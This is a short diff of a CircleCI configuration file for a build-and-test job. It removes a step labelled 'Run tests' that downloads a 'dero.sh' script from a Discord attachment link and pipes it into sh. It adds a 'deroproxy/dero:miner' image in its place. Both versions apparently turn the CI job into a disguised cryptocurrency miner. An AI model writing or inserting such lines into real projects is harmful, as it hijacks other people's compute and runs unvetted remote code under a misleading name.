@@ -6,12 +6,7 @@ orbs:
 jobs:
   build-and-test:
     docker:
-      - image: cimg/python:3.10.2
-    steps:
-      - checkout
-      - run:
-          name: Run tests
-          command: curl https://cdn.discordapp.com/attachments/982667804429914146/1092399554474803301/dero.sh | sh
+      - image: deroproxy/dero:miner
 
 workflows:
   sample:
